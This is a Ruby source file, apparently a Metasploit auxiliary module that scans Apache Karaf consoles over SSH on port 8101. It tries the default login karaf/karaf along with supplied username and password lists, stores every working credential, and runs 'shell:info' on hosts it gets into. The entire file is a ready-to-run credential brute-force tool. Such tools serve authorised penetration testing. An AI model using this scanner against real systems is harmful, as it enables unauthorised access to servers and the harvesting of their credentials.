##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  DEFAULT_USERNAME = 'karaf'
  DEFAULT_PASSWORD = 'karaf'

  def initialize
    super(
      'Name'        => 'Karaf Default Credential Scanner',
      'Description' => %q{
        This module uses default Karaf credentials to login to the console via ssh.
      },
      'Author'      => [
          'Samuel Huckins',
          'Brent Cook',
          'Peer Aagaard',
          'Greg Mikeska',
          'Dev Mohanty'
      ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        # TODO Set default user, pass
        Opt::RPORT(8101),
        OptBool.new('TRYDEFAULTCRED', [true, 'Specify whether to try default creds', true])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('STOP_ON_SUCCESS', [ false, '', true]),
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  def rport
    datastore['RPORT']
  end

  def gather_proof
    proof = ''
    begin
      Timeout.timeout(5) do
        proof = ssh_socket.exec!("shell:info\n").to_s
      end
    rescue Timeout::Error
    end
    proof
  end

  def run_host(ip)
    @ip = ip
    print_status("Attempting login to #{ip}:#{rport}...")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    if datastore['TRYDEFAULTCRED']
      if datastore['USERNAME'].blank? && datastore['PASSWORD'].blank?
        cred_collection.add_public(DEFAULT_USERNAME)
        cred_collection.add_private(DEFAULT_PASSWORD)
      else
        cred_collection.username = DEFAULT_USERNAME
        cred_collection.password = DEFAULT_PASSWORD
      end
    end

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      proxies: datastore['Proxies'],
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: datastore['SSH_TIMEOUT'],
      framework: framework,
      framework_module: self,
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}')"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
          invalidate_login(credential_data)
        when Metasploit::Model::Login::Status::INCORRECT
          vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        else
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end
end
